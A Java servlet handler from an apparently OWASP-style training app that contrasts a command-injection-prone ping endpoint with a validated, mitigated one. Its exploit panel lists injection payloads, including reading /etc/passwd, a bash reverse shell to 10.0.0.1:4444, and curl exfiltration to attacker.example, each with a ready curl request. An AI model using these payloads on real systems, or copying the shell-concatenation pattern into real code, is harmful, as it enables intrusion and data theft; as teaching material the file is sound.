package com.owasp.demo.controller;

import com.owasp.demo.util.Messages;
import com.owasp.demo.config.AppConfig;
import com.owasp.demo.view.TemplateEngine;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class RceHandler implements IRouteHandler {

    private static final Pattern SAFE_HOST  = Pattern.compile(AppConfig.get().getString("rce.safe_host_pattern"));
    private static final java.util.Set<String> DEMO_HOSTS = java.util.Set.copyOf(AppConfig.get().getStringList("rce.demo_hosts"));

    @Override
    public void handle(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String path = req.getPathInfo();

        if ("POST".equals(req.getMethod()) && "/rce/vulnerable".equals(path)) {
            handleVulnerable(req, res);
        } else if ("POST".equals(req.getMethod()) && "/rce/mitigated".equals(path)) {
            handleMitigated(req, res);
        } else {
            renderPage(res, null, null, null, null);
        }
    }

    private void handleVulnerable(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String host = req.getParameter("host");
        String cmd = "ping -c 2 " + host;
        String result;

        if (!SAFE_HOST.matcher(host).matches()) {
            result = "[INJECTION DETECTED — not executed for safety]\n\nConstructed command:\n  " + cmd +
                     "\n\nA real vulnerable server would run this via sh -c, executing the injected payload.";
        } else if (DEMO_HOSTS.contains(host.toLowerCase())) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                String out = new BufferedReader(new InputStreamReader(p.getInputStream()))
                    .lines().collect(Collectors.joining("\n"));
                String err = new BufferedReader(new InputStreamReader(p.getErrorStream()))
                    .lines().collect(Collectors.joining("\n"));
                p.waitFor();
                result = (out + "\n" + err).trim();
            } catch (Exception e) {
                result = "Error: " + e.getMessage();
            }
        } else {
            result = "[DEMO SAFETY BLOCK — '" + host + "' is not in the allowed demo hosts]\n\n" +
                     "Constructed command:\n  " + cmd + "\n\n" +
                     "A real vulnerable server would ping this host, probing internal networks.\n" +
                     "Allowed demo hosts: " + DEMO_HOSTS;
        }
        renderPage(res, host, result, null, null);
    }

    private void handleMitigated(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String host = req.getParameter("host2");
        String result;

        if (host == null || !SAFE_HOST.matcher(host).matches()) {
            result = "Rejected — host contains invalid characters.";
            renderPage(res, null, null, host, result);
            return;
        }

        try {
            ProcessBuilder pb = new ProcessBuilder("ping", "-c", "2", host);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            result = new BufferedReader(new InputStreamReader(p.getInputStream()))
                .lines().collect(Collectors.joining("\n"));
            p.waitFor();
        } catch (Exception e) {
            result = "Error: " + e.getMessage();
        }
        renderPage(res, null, null, host, result);
    }

    private void renderPage(HttpServletResponse res,
                            String vulnInput, String vulnResult,
                            String safeInput, String safeResult) throws IOException {
        String info = TemplateEngine.infoBox(
            Messages.get("rce.info.explanation"),
            Messages.get("rce.info.mitigation")
        );

        String exploits = TemplateEngine.exploitBox(new String[][]{
            {"List files", "localhost; ls -la",
             "Appends a second command after the ping. Shows the working directory contents.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; ls -la'"},
            {"Read /etc/passwd", "localhost && cat /etc/passwd",
             "Reads the system user file. On Linux servers this reveals all local accounts.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost && cat /etc/passwd'"},
            {"Reverse shell", "localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
             "Opens an outbound TCP connection to the attacker's listener — full interactive shell.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"},
            {"Blind exfiltration", "localhost; curl http://attacker.example/?d=$(whoami)",
             "Exfiltrates command output out-of-band via an HTTP request to an external server.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; curl http://attacker.example/?d=$(whoami)'"},
        });

        String vulnForm = """
            <form method="POST" action="/rce/vulnerable" class="space-y-3">
              <label class="block text-sm font-medium text-gray-700">Hostname to ping</label>
              <input type="text" name="host" placeholder="e.g. localhost; ls"
                value="%s"
                class="w-full border border-gray-300 rounded px-3 py-2 text-sm font-mono"/>
              <button class="bg-red-600 text-white px-4 py-2 rounded text-sm hover:bg-red-700">Ping (Vulnerable)</button>
            </form>
            """.formatted(TemplateEngine.escape(vulnInput != null ? vulnInput : ""));

        String safeForm = """
            <form method="POST" action="/rce/mitigated" class="space-y-3">
              <label class="block text-sm font-medium text-gray-700">Hostname to ping</label>
              <input type="text" name="host2" placeholder="e.g. localhost"
                value="%s"
                class="w-full border border-gray-300 rounded px-3 py-2 text-sm font-mono"/>
              <p class="text-xs text-gray-500 mt-1">Only <code>[a-zA-Z0-9._-]</code> allowed — no shell metacharacters.</p>
              <button class="bg-green-600 text-white px-4 py-2 rounded text-sm hover:bg-green-700">Ping (Safe)</button>
            </form>
            """.formatted(TemplateEngine.escape(safeInput != null ? safeInput : ""));

        String panels = """
            <div class="grid md:grid-cols-2 gap-6">%s%s</div>
            """.formatted(
                TemplateEngine.demoPanel(Messages.get("rce.panel.vulnerable"), "red", vulnForm,
                    vulnResult != null ? TemplateEngine.resultBox(
                        "<pre class='text-xs overflow-auto whitespace-pre-wrap'>" +
                        TemplateEngine.escape(vulnResult) + "</pre>", false) : ""),
                TemplateEngine.demoPanel(Messages.get("rce.panel.mitigated"), "green", safeForm,
                    safeResult != null ? TemplateEngine.resultBox(
                        "<pre class='text-xs overflow-auto whitespace-pre-wrap'>" +
                        TemplateEngine.escape(safeResult) + "</pre>", true) : "")
            );

        String content = TemplateEngine.vulnerabilityBadge(Messages.get("rce.badge.id"), Messages.get("rce.badge.name"), Messages.get("rce.badge.tag")) + info + exploits + panels;
        res.getWriter().write(TemplateEngine.page(Messages.get("rce.title"), content, true));
    }
}
